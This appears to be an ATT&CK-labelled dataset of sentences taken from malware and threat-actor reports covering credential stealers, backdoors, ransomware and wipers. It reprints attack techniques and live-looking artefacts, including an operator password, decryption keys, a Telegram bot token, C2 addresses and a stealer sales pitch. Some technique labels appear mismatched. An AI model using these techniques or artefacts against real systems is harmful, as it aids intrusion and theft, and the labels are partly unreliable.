Mimikatz publicly available code (top); strings from a Mimikatz modification (bottom)The pc.exe executable stages the execution of three other components that ultimately result in stealing credentials from the Local Security Authority Subsystem Service (LSASS) process.,T1003.001
"The execution of pc.exe requires a password supplied by the operator (in this case, P2sSW0rd1234!@#$C), which the operator provides through the key command-line parameter.",T1140
"pc.exe decrypts AddSecurityPackage64.dll and pc.dll using the AES encryption algorithm, providing the operator-provided execution password as an initialization vector.",T1140
pc.exe loads and executes the decrypted AddSecurityPackage64.dllusing reflective image loading.,T1140
This allows mim221 to inspect and extract credentials from the LSASS process.,T1562.001
Disabling Windows event logging in an attempt to evade detection; and Injecting pc.dll into LSASS as a Security Package.,"T1562.001, T1055"
Security Packages are used to extend the Windows authentication mechanism and can be abused to execute malicious code in the context of LSASS.,"T1562.001, T1055"
"In an attempt to remain undetected, AddSecurityPackage64.dll disables Windows event logging by killing threads of the Windows Event Log service without stopping the execution of the service itself.",T1562.001
"This is achieved by locating the process that hosts the Event Log, enumerating the processes’ threads, identifying the threads assigned to the service by their service tag (eventlog), and terminating them.",T1057
Querying service tag informationAddSecurityPackage64.dll injects pc.dll into LSASS by deploying pc.dll as a Security Package.,T1055
"This call instructs LSASS to load and execute pc.dll, which then stages the getHashFlsa64.dll credential theft component.",T1003.001
"getHashFlsa64.dll conducts credential theft in the context of LSASSpc.dll and getHashFlsa64.dll In the context LSASS, pc.dll decrypts, reflectively loads, and executes the code credential theft component getHashFlsa64.dll in a manner similar to pc.exe.",T1140
getHashFlsa64.dll accesses the memory of its host LSASS process and stores stolen credentials in a Mimikatz log file named pc.log for later exfiltration.,T1003.001
"For example, the implementation of AddSecurityPackage64.dll looks like an adaptation of public code that demonstrates injection of a Security Package into LSASS using RPC calls.",T1003.001
"This includes deploying webshells at Microsoft Exchange servers for establishing an initial foothold, following same file naming conventions, using the LG tool and the net, query, and tasklist Windows built-in tools for gathering user and process information, and the PsExec Windows Sysinternals tool and net for lateral movement and exploration, respectively.","T1570, T1057"
"By pivoting on the original filename of mim221’s getHashFlsa64.dll, we observed another sample that steals credentials from LSASS.",T1003.001
"After analyzing the samples, we found four different versions of the malware, all of which rely on an embedded JavaScript Observed Notation (JSON)-based configuration to set parameters before encrypting files.",T1027
"Revix’s JSON-based configuration While some parameters are ignored by the ransomware, these are most important ones that we observed: pk: A 64-byte key nbody: The ransomware note text-encoded in base64 nname: The ransomware note name ext: The extension added to encrypted files After compromising the system, the malicious actors execute it manually on a NAS device to encrypt files and create a ransom note with a unique key per victim.",T1027
"StealthWorker In 2021, security researchers found brute-force attacks launched from the StealthWorker botnet on Synology NAS devices.",T1110
We found multiple samples for this botnet and confirmed that newer versions are capable of brute-forcing and compromising servers running on several products and systems such as WooCommerce and WordPress.,T1110
"Valid credentials found during compromise are then uploaded to the command-and-control (C&C) server, usually at port 5028/TCP. Figure 4.","T1041, T1095, T1078"
"By: Aliakbar Zahravi, Peter Girnus February 09, 2023Read time: ( words) Save to Folio Subscribe We recently found an active campaign that uses a fake employment pretext targeting Eastern Europeans in the cryptocurrency industry to install an information stealer.",T1005
"In this campaign, the suspected Russian threat actors, use several highly obfuscated and underdevelopment custom loaders in order to infect those involved in the cryptocurrency industry with Enigma stealer (detected as TrojanSpy.MSIL.ENGIMASTEALER.YXDBC), which is a modified version of the Stealerium information stealer.",T1027
"In addition to these loaders, the attacker also exploits CVE-2015-2291, an Intel driver vulnerability, to load a malicious driver designed to reduce the token integrity of Microsoft Defender.",T1068
"Stealerium, the original information stealer which serves as the base for Enigma Stealer, is an open-source project written in C# and markets itself as a stealer, clipper, and keylogger with logging capabilities using the Telegram API.","T1005, T1056.001"
"The infection chain starts with a malicious RAR archive — in this instance, contract.rar (SHA256: 658725fb5e75ebbcb03bc46d44f048a0f145367eff66c8a1a9dc84eef777a9cc) — which is distributed to victims via phishing attempts or through social media.","T1027, T1566.001"
"The archive contains the files, Interview questions.txt, and Interview conditions.word.exe.",T1140
This serves to further legitimize the package in the eyes of the victim and draw attention away from the malicious binary. Figure 3.,T1036.005
"This file, which also masquerades as a legitimate word document, is designed to lure unsuspecting victims into executing the loader.","T1204.002, T1036.005"
"The first utilizes Telegram for delivering payloads, sending commands, and receiving the payload heartbeat.","T1095, T1105"
This server registers a newly infected host when Interview conditions.word.exe is executed by the victim.,T1204.002
"Its primary objective is to download, deobfuscate, decompress, and launch the secondary stage payload.","T1105, T1140"
"The malware incorporates multiple tactics to avoid detection and complicate reverse engineering, such as API hashing, string encryption, and irrelevant code.",T1027
"Before delving into the analysis of ""EngimaDownloader_s001,"" let's first examine how the malware decrypts strings and resolves hashed Windows APIs.","T1027, T1140"
EngimaDownloader_s001 API Hashing: API hashing is a technique employed by malware to conceal the utilization of potentially suspicious APIs (functions) from static detection.,T1027
"It involves replacing the human-readable names of functions (such as ""CreateMutexW"") with a hash value, such as 0x0FD43765A.",T1027
"The hash value is then used in the code to call the corresponding API function, rather than using the human-readable name.",T1027
Custom implementation of murmur hash The malware employs dynamic API resolving to conceal its API imports and make static analysis more difficult.,T1027
"This technique involves storing the names or hashes of the APIs needed, then importing them dynamically at runtime.",T1027
The Windows API offers LoadLibrary and GetProcAddress functions to facilitate this.,T1106
"kernel32_RegSetValueExA 0xC2D33DC : ntdll_RtlGetVersion 0xBD5D03A : kernel32_GetNativeSystemInfo 0x10BEDD60 : wininet_CreateMD5SSOHash To resolve the API hash, the malware first passes two arguments to the ""mw_resolveAPI"" function.",T1027
"WinInet.dll userenv.dll psapi.dll netapi32.dll mpr.dll wtsapi32.dll api-ms-win-core-processthreads-l1-1-0.dll ntoskrnl.exe Rpcrt4.dll User32.dll api-ms-win-core-com-l1-1-0.dll Cabinet.dll shell32.dll OleAut32.dll Ole32.dll ntdll.dll mscoree.dll kernel32.dll advapi32.dll The library name and export function name hashed value is then passed to GetExportAddressByHash, which is responsible for opening the handle to the library, creating a hash for each export function name, and comparing it with the passed argument.",T1027
Retrieving the address of an API The code snippet in Figure 11 demonstrates how mw_GetExportAddressByHash resolves the given API hash and retrieves the address of an exported function.,T1027
"Upon execution, the malware creates the mutual exclusion object (mutex) to mark its presence in the system and retrieves the MachineGuid of the infected system from the SOFTWARE\Microsoft\Cryptography\MachineGuid registry key, which it uses as a unique identifier to register the system with its C&C server and track its infection.",T1012
"Constructing a unique system identifier and creating a mutex It then deletes the HKCU\SOFTWARE\Intel registry key and recreates it with two values, HWID and ID, as shown in Figure 13. Figure 13.",T1112
Recreating HKCU\SOFTWARE\Inte It then collects information about the .NET Framework Setup on the infected system and sends it to its C&C server as shown in Figure 14. Figure 14.,T1082
"The first one ,193[.]56[.]146[.]29, is used to send program execution DEBUG and Telegram to deliver payloads and send commands.","T1095, T1105"
"To download the next stage payload, the malware first sends a request to the attacker-controlled Telegram channel https://api[.]telegram[.]org/bot{token}/getFile to obtain the file_path.",T1095
"The code responsible for decrypting the next stage payload file_id and Telegram token If the file's download, deobfuscation, and decompression are successful, the malware sends the message ""bot getted"" to the debug server. Figure 19.","T1095, T1140"
"Successful payload retrieval debug message To decompress the payload, the malware uses Microsoft Cabinet's Compressapi with the compression algorithm (""COMPRESS_RAW | COMPRESS_ALGORITHM_LZMS"").",T1106
"Payload deobfuscation and decompression Before executing the payload, the malware attempts to elevate its privileges by executing the mw_UAC_bypass function, which is part of an open-source project.",T1548.002
"This technique, Calling Local Windows RPC Servers from .NET (which was unveiled in 2019 by Project Zero), allows a user to bypass user account control (UAC) using only two remote procedure call (RPC) requests instead of DLL hijacking.",T1548.002
"Finally, the malware executes an export function called ""Entry"" from UpdateTask.dll via rundll32.exe as shown in Figure 23. Figure 23.",T1218.011
Running the stage 2 payload through rundll32.exe Stage 2: EngimaDownloader_s002 MD5 SHA-1 SHA-256 File size 377f617ccd4aa09287d5221d5d8e1228 288358deaa053b30596100c9841a7d6d1616908d f1623c2f7c00affa3985cf7b9cdf25e39320700fa9d69f9f9426f03054b4b712 497.50 KB (509440 bytes),T1218.011
The primary objective of this malware is to disable Microsoft Defender by deploying a malicious kernel mode driver (“bring your own vulnerable driver” or BYOVD method) via exploiting a vulnerable Intel driver (CVE-2015-2291) and then downloading and executing the third-stage payload.,"T1562.001, T1068"
"Upon execution, the malware creates the mutex to mark its presence on the system and retrieves the MachineGuid of the infected system from the ""SOFTWARE\Microsoft\Cryptography\MachineGuid"" registry key.",T1012
"Constructing a unique system identifier and creating a mutex Next, the malware will determine if it is running as an account with administrator privileges or simply as a regular user using the GetTokenInformation API.","T1033, T1106"
"Stage 2 embedded binary files Name MD5 SHA-1 SHA-256 iQVW64.SYS (CVE-2015-2291) Vulnerable Intel driver, used for kernel exploitation 1898ceda3247213c084f43637ef163b3 d04e5db5b6c848a29732bfd52029001f23c3da75 4429f32db1cc70567919d7d47b844a91cf1329a6cd116f582305f3b7b60cd60b Driver.",T1027
The malware then establishes persistence on the targeted system by creating scheduled tasks. Figure 28.,T1053.005
SYS 28ca7a21de60671f3b528a9e08a44e1c 21F1CFD310633863BABAAFE7E5E892AE311B42F6 D5B4C2C95D9610623E681301869B1643E4E2BF0ADCA42EAC5D4D773B024FA442 The driver's sole purpose is to patch the integrity level of the Microsoft defender (MsMpEng.exe) and forcibly reduce it from system to untrusted integrity.,T1562.001
"It is responsible for downloading, decompressing, and executing the final stealer payload on an infected system.",T1140
"The malware also accepts commands from a Telegram channel, though these commands may vary between variants.",T1095
"stop alive runassembly Upon launch, the malware sends a ""Bot started"" message to both the Debug server and the Telegram channel, indicating its successful execution. Figure 34.",T1095
It then sends a GET request to https://api[.]telegram[.]org/bot{token}/getUpdates to retrieve the command.,T1095
"Upon receiving the runassembly command, the malware downloads the next part of the final stage payload (file_19.pack), decompresses it using the GZipStream API, and executes it.","T1105, T1140"
"Upon execution, the malware initializes configuration and sets up its working directory. Figure 37.",T1074.001
"Engima Stealer initialization The malware configuration is as follows: public static string Version = ""0.05.01""; public static string DebugMode = ""0""; public static string Mutex = ""6C0560CE-2E75-4BB4-A26E-F08592A1D56D""; public static string AntiAnalysis = ""0""; public static string Autorun = ""1""; public static string StartDelay = ""0""; public static string WebcamScreenshot = ""1""; public static string KeyloggerModule = ""0""; public static string ClipperModule = ""0""; public static string GrabberModule = ""0""; public static string TelegramToken = ""5894962737:AAHAFZnz2AkLAyHC0G-7S2je9JMWWLJHGsU""; public static string TelegramChatID = ""5661436914""; It then starts to collect system information and steals user information, tokens, and passwords from various web browsers and applications such as Google Chrome, Microsoft Edge, Microsoft Outlook, Telegram, Signal, OpenVPN and others.","T1078, T1074.001"
It captures screenshots and extracts clipboard content and VPN configurations.,T1113
The collected information is then compressed and exfiltrated to the attacker via Telegram.,T1041
"Enigma Stealer capabilities It's worth mentioning that some strings, such as web browser paths and Geolocation API services URLs, are encrypted with the AES algorithm in cipher-block chaining (CBC) mode.",T1573.001
"This new backdoor gathers basic system information, which it then sends to the C2, and in return receives an AES encrypted payload.","T1041, T1027, T1082"
"Dave Loader loads the resources using the API calls LdrFindResource_U and LdrAccessResource, and decrypts them using XOR and the key mh8ZqMlTsaDYBZe7ma\x00.","T1106, T1140"
"Dave Loader executes the decrypted shellcode and passes the PE payload to it, which the shellcode then loads and executes.","T1055, T1140"
"Upon execution, Domino Backdoor starts by generating a Bot ID for the infected system by gathering the username and hostname and creating a hash of the collected data, to which it then appends its current process id.","T1033, T1005, T1082"
"However, Lizar used a CRC algorithm to create its hash, whereas Domino uses a custom algorithm which XOR’s multiple values together.",T1027
"Interestingly, Lizar used a similar XOR-based algorithm as part of its encryption mechanisms during communication with the C2. Fig 1 — Domino Backdoor system ID generation The malware then proceeds to decrypt its configuration block, which is stored in the data section of the binary.","T1573.001, T1140"
The config is decrypted using XOR and a 16-byte key which is stored immediately before the encrypted config block.,"T1027, T1140"
"Fig 2 — Domino Backdoor config decryption In the analysed sample the decrypted config contains two pipe-delimited IP addresses, 88.119.175[.]124 and 94.158.247[.]72.",T1140
"This is the same format used by Lizar to store its configuration. 00000000 38 38 2e 31 31 39 2e 31 37 35 2e 31 32 34 7c 39 |88.119.175.124|9| 00000010 34 2e 31 35 38 2e 32 34 37 2e 37 32 00 6e ee 99 |4.158.247.72.nî.| 00000020 37 b1 2d 84 e5 8d 6a 70 21 3e d5 21 2c c1 37 b5 |7±-.å.jp!>Õ!,Á7µ| 00000030 1f b7 09 f3 9b 0a c7 fe 53 32 23 6a 8c b0 4e 22 |.·.ó..ÇþS2#j.°N”| Scroll to view full table",T1140
"A second config block, which is decrypted separately, contains an RSA public key.","T1027, T1140"
"The malware generates a random 32-byte key, which it encrypts using the RSA key.",T1027
It then attempts to connect to the C2 via TCP port 443 and send the encrypted key.,T1095
"If the initial connection is successful, the malware then proceeds to gather basic system information, including username, computer name, and OS version, which it then encrypts using AES-256-CBC and the generated, shared key (null bytes used for IV).","T1573.001, T1033, T1082"
"The malware first sends 4 bytes to the C2 that contain a XOR-encrypted value, which is the size of the data to follow, and then sends the AES-encrypted system data.",T1573.001
"The malware then begins a loop of checking in with the C2 by first sending a 4-byte encrypted size, followed by a 16-byte AES-encrypted block, which decrypts to the following 5 bytes {01 00 00 00 ff}.",T1140
The malware then decrypts the received payload using AES and the shared key.,T1140
"The decrypted data consists of a 4 byte size, followed by a single byte indicating either a command or the load method that the malware should use for the payload, followed by the payload data itself, if applicable.",T1140
"If the command byte is 0x7, then the malware enumerates the running processes on the system and compiles a list of process names and IDs.",T1057
This data is then encrypted using AES and returned to the C2.,T1573.001
"0x1 — Copy the payload into allocated memory within the current process and create a new thread to execute an export named ReflectiveLoader within the payload DLL. 0x4 — Save the payload to the %Temp% directory with a filename generated via GetTempFileNameA, and execute the file using CreateProcessA. 0x5, 0x6 — Open process with process id provided with the downloaded data.",T1106
"In addition to having similar coding styles and utilising similar API calls, Domino Backdoor uses the same configuration structure as the Lizar Loader.",T1106
"In both cases, a configuration block containing a pipe-delimited list of IP addresses is decrypted using XOR and a 16-byte key which is stored immediately before the encrypted config.","T1027, T1140"
In the case of Domino Backdoor a hash is generated from the system username and hostname and the process ID is appended.,"T1033, T1082"
The hashing algorithm is custom and appears to be based on an encryption algorithm used previously in the Lizar Loader.,T1027
"For example, the system information gathered by Domino Backdoor and sent to the C2 matches the reported functionality of Lizar’s Info32/Info64.dll plugin.",T1041
"Also, the function within Domino Backdoor to enumerate running processes and send a list of process names and IDs back to the C2 is very similar to the functionality of Lizar’s ListProcesses32/ListProcesses64.dll plugin.","T1041, T1057"
"Once loaded, Domino Loader starts by loading an encrypted payload from its resources and decrypting it using AES-256-CBC and a hardcoded key.","T1027, T1140"
The Microsoft WinCrypt library is used for AES encryption and decryption by both Domino Backdoor and Loader.,"T1027, T1140"
"The decrypted data consists of 4 bytes containing the payload size, followed by a further 4 bytes containing either the entry point offset for the payload or a value indicating the load method which should be used, followed by the payload itself.",T1140
If the value of the load field is -1 then the loader allocates memory within the current process and then loads the PE payload into it using the full PE loading procedure.,T1055
"It copies the headers, maps the individual PE sections, processes any relocations, loads the PE’s imports, and then executes the PE from its internally specified entry point.",T1055
"– Selling together with all sources (build, builder, panel) FUNCTIONALITY : Spoiler: STEALER – Log collection takes place in memory – Collection of data from Chromium browsers (Cookies/CC/Passwords/Autofills/Bookmars/History) v80+ – Collection of data from Gecko browsers (Cookies/Passwords/Bookmark/History) v80+ – Collection of RDP/FTP sessions – Grabbink files from the desktop (by extension) – Collection of UserAgent – Collection of information about the system in HTML format – Collect Vpn (NordVpn/OpenVpn/ProtonVpn) –",T1082
"Electrum,Electrum-Dash,Ethereum,Exodus,Atomic,Jaxx,Coinomi,Guarda,Armory,Zcash,Bytecoin List of supported crypto plugins: TronLink, MetaMask, Binance Chain Wallet Anti-sniffer: All programs that catch http/https data transfer are closed [even if the name is changed] – Self-delete after sending data (on/off) – CIS(Lock start in CIS countries) (on/off) – Blocking startup on virtual machines (on/off) – Sending data to the Web-panel (IP logger is on the side of the panel)","T1071.001, T1070.004"
"Browsers include: “\\Mozilla\\Firefox”, “\\Comodo\\IceDragon”, “\\Mozilla\\SeaMonkey”, “\\Moonchild Productions\\Pale Moon”, “\\Waterfox”, “\\K-Meleon”, “\\Thunderbird”, “\\8pecxstudios\\Cyberfox”, “\\NETGATE Technologies\\BlackHaw” CryptoWallet data from browser extensions MetaMask, TronLink, and Binance Clipboard data The following data collection tasks are then all set to run in parallel. CryptoWallets on disk from apps including: Electrum, Electrum-Dash, Ethereum, Exodus, Atomic, Jaxx, Coinomi, Guarda, Armory, Zcash, Bytecoin System info, including both hardware and OS info.","T1057, T1082"
"Enumerates running processes Enumerates IDs from Steam application Enumerates files under Steam application directory Gets a list of installed browsers by looping through entries under registry key SOFTWARE\\Clients\\StartMenuInternet and SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet, and then recording the contents of subkey shell\\open\\command for each.","T1083, T1057, T1012"
Enumerate files on desktop Discord Tokens FoxMail data DynDNS credentials FileZilla connection credentials + hosts.,T1083
"Fig 7 — Nemesis waits for data collection tasks to complete, then adds the data to a zip archive to be sent to the C2 Fig 8 — Nemesis uploads data to the C2 via a HTTP POST request The C2 address for the analysed sample is https[:]//es-megadom[.]com Fig 9 — Nemesis Configuration A Tangled Web Provides Opportunities This analysis highlights the intricate relationships between cybercriminal groups and their members.","T1005, T1071.001"
TA0002 Execution;T1106 Native API;BlackCat ransomware uses Native API. ;,T1106
"T1053 Scheduled Task/Job;When deploying ransomware in the victim’s network infrastructure, BlackCat affiliates may exploit group policies, which results in a scheduled task being created (on each host) that launches the ransomware. ;T1059.001 Command and Scripting Interpreter:",T1053.005
"PowerShell;The attackers may use PowerShell scripts when deploying ransomware in the victim’s network, disabling security tools, and encrypting files. ;T1059.003",T1562.001
"Windows Command Shell;For stopping IIS, deleting Volume Shadow Copies, disabling recovery, clearing Windows event logs, etc., the BlackCat ransomware uses the command shell to run appropriate commands.",T1059.003
"Instrumentation;The attackers may use wmic to obtain information and run various commands, including to delete Volume Shadow Copies.",T1047
"They may also use the wmiexec module from Impacket to execute commands and move across the network. ;T1569.002 System Services: Service Execution;The BlackCat ranswomare for Windows can self-propagate in the local area network using the legitimate PsExec utility (contained in its body), which creates a temporary system service.","T1047, T1569.002"
TA0003 Persistence;T1505 Server Software Component;Successfully exploiting ProxyShell vulnerabilities enabled the attackers to place a web shell on a vulnerable Microsoft Exchange server. ;T1078 Valid Accounts;Legitimate accounts obtained by the attackers can be used to ensure persistence in the compromised infrastructure.,T1078
"TA0004 Privilege Escalation;T1078 Valid Accounts;To escalate privileges, BlackCat may use stolen legitimate accounts specified in the configuration data. ;T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control;To bypass UAC, BlackCat ransomware may escalate privileges using the ICMLuaUtil COM interface, as well as use the Masquerade PEB method. ;T1134.002 Access Token Manipulation: Create Process with Token;To escalate privileges, the BlackCat ransomware can launch its process using stolen authentication data and the function CreateProcessWithLogonW. TA0005 Defense Evasion;T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control;The attackers may bypass UAC using the ICMLuaUtil COM interface, as well as use the Masquerade PEB method. ;T1140 Deobfuscate/Decode Files or Information;BlackCat decrypts configuration data as well as decrypts and unpacks the legitimate PsExec utility and an additional BAT file contained in the body of the ransomware. ;T1027 Obfuscated Files or Information;BlackCat ransomware uses obfuscation.","T1140, T1548.002, T1106, T1078, T1027, T1059.003"
";T1562.001 Impair Defenses: Disable or Modify Tools;To prevent being detected, the attackers end processes and services related to security and antivirus software. ;T1497 Virtualization/Sandbox Evasion;To counter analysis (including in a sandbox), ALPHV MORPH checks the value of the command line parameter access-token.",T1562.001
"T1036 Masquerading;The attackers use a SoftPerfect Network Scanner executable renamed to svchost.exe. ;T1112 Modify Registry;To propagate, BlackCat uses PsExec to modify the system registry parameter MaxMpxCt to increase the number of failed network requests for each client.","T1112, T1036.005"
"TA0006 Credential Access;T1003.001 OS Credential Dumping: LSASS Memory;To obtain authentication data, the attackers may dump the LSASS process using legitimate tools (procdump, comsvcs.dll).",T1003.001
";T1552 Unsecured Credentials;To obtain authentication data from the registry and files, the attackers may use NirSoft utilities.",T1552.001
";T1087.002 Account Discovery: Domain Account; ;T1482 Domain Trust Discovery;To obtain information about domain trust, the attackers used the ADRecon tool. ;T1046 Network Service Scanning;To scan the target network, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1135 Network Share Discovery;To search for network shares, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1016 System Network Configuration Discovery;For network reconnaissance, the attackers use the open-source utility SoftPerfect Network Scanner. ;T1082 System Information Discovery;BlackCat uses wmic to obtain the UUID of the compromised host.","T1047, T1082"
";T1057 Process Discovery;BlackMatter enumerates all running processes to search for ones relating to security, backups, databases, email systems, office programs, etc. ;T1007 System Service Discovery;BlackCat enumerates system services to search for ones relating to security, backups, and databases. ;T1083 File and Directory Discovery;The attackers enumerate drives, directories, and files to search for sensitive information for exfiltration purposes.","T1005, T1083, T1057, T1518.001"
"Remote Desktop Protocol;The attackers may use RDP to move across the network. ;T1021.002 Remote Services: SMB/Windows Admin Shares;After obtaining privileged authentication data, in order to spread over the local area network and access network resources, the attackers may use the PsExec utility, as well as the psexec, wmiexec and smbexec modules from Impacket. ;T1021.004 Remote Services: SSH;To access parts of the infrastructure running on Linux, the attackers use the PuTTY utility. ;T1570 Lateral Tool Transfer;Moving across the victim’s network and deploying ransomware involves copying related tools to the host.","T1570, T1021.001"
The BlackCat ransomware can self-propagate in the network by using the legitimate PsExec utility contained in its body.,T1570
"TA0009 Collection;T1560.001 Archive Collected Data: Archive via Utility;Before being exfiltrated, data may be put in archives using 7-Zip. ;T1005 Data from Local System;The attackers collect information from the local system for exfiltration purposes. ;T1039",T1005
"Data from Network Shared Drive;The attackers collect information from available network resources for exfiltration purposes. ;T1074 Data Staged;Before exfiltration, the attackers may put collected data in 7Zip archives. ;T1119 Automated collection;The attackers use ExMatter, a tool for automated collection of sensitive information.",T1074.001
"TA0011 Command and Control;T1071 Application Layer Protocol;Remote access tools used by the attackers may use application layer protocols (HTTP, HTTPS, DNS). ;T1105",T1071.001
"Ingress Tool Transfer;After gaining initial access, the attackers copy tools necessary for deployment to the compromised host. ;",T1105
"Protocol Tunneling;To access the compromised system, the attackers may use tunnels built using ngrok or gost. ;T1573 Encrypted Channel;To remotely access the compromised infrastructure, the attackers may use Cobalt Strike, TeamViewer and ScreenConnect, which perform asymmetric/symmetric encryption of the C&C server communication channel. ;","T1573.001, T1219"
"Remote Access Software;To remotely access the compromised infrastructure, the attackers may use the legitimate tools TeamViewer and ScreenConnect.",T1219
"Over C2 Channel;When the attackers use Cobalt Strike, the collected information may be sent via Cobalt Strike server communication channels. ;T1048.002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol;The attackers may use the ExMatter exfiltration tool, which sends stolen data to SFTP and WebDav resources specified in the ExMatter configuration. ;T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage;The attackers use the Rclone synchronization utility to upload stolen data to the legitimate cloud storage service MEGA. ;T1020 Automated Exfiltration;After access has been gained, files from target hosts are automatically uploaded to the legitimate cloud storage service MEGA using the Rclone utility.",T1041
"For this reason, in addition to destroying the data, many wipers first destroy two special files in the system: The Master Boot Record (MBR), which is used during the boot process to identify where the Operative System is stored in the disk.",T1082
"Finally, the malware executes a command to delete itself from the system (T1070.004).",T1070.004
"The attackers have been seen using several methods to distribute the wiper through the domain, like: domain Group Policy Object (GPO) (T1484.001), Impacket or SMB (T1021.002) and WMI (T1047) with an additional worm component named HermeticWizard.","T1047, T1484.001"
"The wiper component first installs the payload as a service (T1569.002) under C:\Windows\system32\Drivers\. Afterwards, the service corrupts the first 512 bytes of the MBR of all the Physical Drives, and then enumerates their partitions.","T1083, T1543.003"
"Before attempting to overwrite as much data as the wiper can it will delete key files in the partition, like MFT, $Bitmap, $LogFile, the NTUSER registry hive (T1112) and the event logs (T1070.001).",T1070.004
"Named DoubleZero, the wiper was distributed as a ZIP file containing an obfuscated .NET program.",T1027
"The wiper’s routine sets a hardcoded list of system directories, which are skipped during an initial wiping targeting user files.",T1083
"Afterwards, the skipped system directories are targeted and finally the registry hives: HKEY_LOCAL_MACHINE (containing the hives Sam, Security, Software and System), HKEY_CURRENT_USER and HKEY_USERS.",T1083
Contents Higaisa shortcuts Attribution Crosswalk Loaders and injectors Injectors Local shellcode loaders Attack examples An encrypted resume I can't breathe Chat transcript Attacks on Russian game developers Unity3D Game Developer from St. Petersburg HFS with a surprise A purloined certificate FunnySwitch Unpacking Funny.dll Transport protocols Network-level protocol Application-level protocol Supported commands Unused code FunnySwitch vs. Crosswalk ShadowPad PlugX Paranoid PlugX Conclusion PT products detection names PT Sandbox PT Network Attack Discovery Applications Known names of files from which PL shellcode may be loaded IOCs MITRE 1.,"T1027, T1071.001"
At the core of the attack is an archive named Project link and New copyright policy.rar (75cd8d24030a3160b1f49f1b46257f9d6639433214a10564d432b74cc8c4d020).,T1027
The archive contains a bait PDF document (Zeplin Copyright Policy.pdf) plus the folder All tort's projects - Web lnks with two shortcuts: Conversations - iOS - Swipe Icons - Zeplin.lnk Tokbox icon - Odds and Ends - iOS - Zeplin.lnk The structure of malicious shortcuts resembles the sample 20200308-sitrep-48-covid-19.pdf.lnk spread by the Higaisa group in March 2020.,"T1027, T1036.005"
"Comparing command lines in the covid-19 and Zeplin shortcutsThe mechanism for initial infection is fundamentally the same: trying to open either of the shortcuts leads to running a command that extracts a Base64-encoded CAB archive from the body of the LNK file, after which the archive is unpacked to a temporary folder.","T1140, T1204.002"
Further actions are performed with the help of an extracted JS script.,T1140
"Contents of script 34fDFkfSD32.jsBut here is where the similarity with the sample described in our Higaisa report ends: instead, this script copies the payload to the folder C:\Users\Public\Downloads, achieves persistence by adding itself to the startup folder and adding a scheduler task, and runs the payload.","T1547.001, T1053.005, T1036.005"
The script also sends the output of ipconfig in a POST request to http://zeplin.atwebpages[.]com/inter.php.,T1071.001
The command run by the shortcut also contains the opening of a URL file extracted from the archive.,T1071.001
"On May 30, 2020, a new malicious archive, CV_Colliers.rar (df999d24bde96decdbb65287ca0986db98f73b4ed477e18c3ef100064bceba6d), was detected.",T1027
"In this case, the bait consisted of PDF documents with a CV and IELTS certificate.",T1036.005
"Depending on which shortcut was opened, the output of ipconfig was sent to one of two addresses: http://goodhk.azurewebsites[.]net/inter.php or http://sixindent.epizy[.]com/inter.php.",T1071.001
Note that all three intermediate C2 servers are on third-level domains on a free hosting service.,T1090
"The main component connects to a C2 server, collects and sends system information, and contains functionality for installing and running up to 20 additional modules received from the server as shellcode.",T1005
The information collected by the module includes: OS uptime Network adapter IP addresses MAC address of one of the adapters Operating system version and whether it is 32-bit or 64-bit Username Computer name Name of running module PID Shellcode version and whether it is 32-bit or 64-bit (The shellcode supports both 32 and 64 bits.),"T1033, T1016, T1082"
The network configuration for this particular sample is at the end of the shellcode and is XOR encrypted with a 16-byte key.,T1027
"Then, one after the other, it tries combinations of possible proxy servers (any indicated in the configuration plus system proxies) and C2 servers until it connects successfully.",T1090
"The communication protocol used between the backdoor and C2 server can be separated logically into two levels: Application-level protocol Transport-level protocol On the application level, messages consist of the following fields: FakeTLS header consisting of 5 bytes: Entry type and protocol version (3 bytes).","T1095, T1071.001"
"For all subsequent messages, the content (not including the FakeTLS header) is transferred in the corresponding encrypted session key. AES-128 is the encryption algorithm used.",T1573.001
Four protocols are supported: Standard TCP connection Application-level messages are sent unchanged as TCP segments.,T1095
Equivalent to HTTP Long Polling The client creates two TCP connections.,T1095
"During the first connection, a GET request is sent to the C2 server.",T1071.001
The subsequent stream of application-level messages from the server to the client is sent as the body of an HTTP response.,T1071.001
"After receipt of a response with code 200, subsequent messages from the client to the server are sent using separate POST requests.",T1071.001
Second HTTP connection with C2 Duplication of socket with TLS connection The client establishes a TCP connection and sends an HTTPS request like the following one: GET /msdn.cpp HTTP/1.1 Connection: Keep-Alive User-Agent: WinHTTP/1.1 Content-Length: 4294967295 Host:,"T1095, T1071.001"
Subsequent messages are exchanged in the original TCP connection (without TLS encryption).,T1095
Additional packets with FakeTLS header KCP protocol This protocol can be implemented on top of any other protocol (including UDP) to ensure quick and reliable data transfer.,T1095
The Crosswalk client uses KCP on top of a TCP connection: KCP protocol data is added to application-level messages that are then sent as TCP segments.,T1095
We can categorize these objects into two groups: local shellcode loaders and injectors.,T1055
Some of the samples in both groups are also obfuscated with VMProtect.,T1027
"Code for injecting shellcode into a running processThe injectors contain typical code that obtains SeDebugPrivilege, finds the PID of the target process, and injects shellcode into it.","T1106, T1057, T1055"
"The samples we found contain one of three payloads: Crosswalk Metasploit stager FunnySwitch (discussed later in this report) Crosswalk and FunnySwitch shellcode is located in the data sections ""as-is,"" while the samples with Metasploit show additional XOR encryption with the key ""jj1"".",T1027
2.2 Local shellcode loaders The main function of the malware is to extract shellcode and run it in an active process.,"T1055, T1140"
"Code of the loader's main functionAfter the malware finds the API functions it needs, it decrypts the string Global\0EluZTRM3Kye4Hv65IGfoaX9sSP7VA with the ChaCha20 algorithm.","T1106, T1140"
"String ""CSPELOADKISSYOU"" in data sectionIn the self-contained loaders, the shellcode is located in a PE file overlay.",T1027
"The shellcode is stored in a curious way: data starts from 0x60 bytes of the header, followed by the (encrypted) shellcode.",T1027
The other header data is used for decryption: a 32-byte key is located at offset 0x28 and a 12-byte nonce for the ChaCha20 algorithm is at offset 0x50.,T1140
Handling of PL shellcode in the loader body (ChaCha20)The ChaCha20 implementation is not always present: some of the samples use Microsoft CryptoAPI with AES-128-CBC for encryption.,"T1027, T1106"
"We can also find key information here in the structure of the PL shellcode: at offset 0x28, there are 32 bytes that are hashed with MD5 to obtain a cryptographic key.",T1027
Handling of PL shellcode in the loader body (AES-128)Older loader versions use Cryptography API:,T1106
They use AES-128 in CFB mode as the encryption algorithm.,T1027
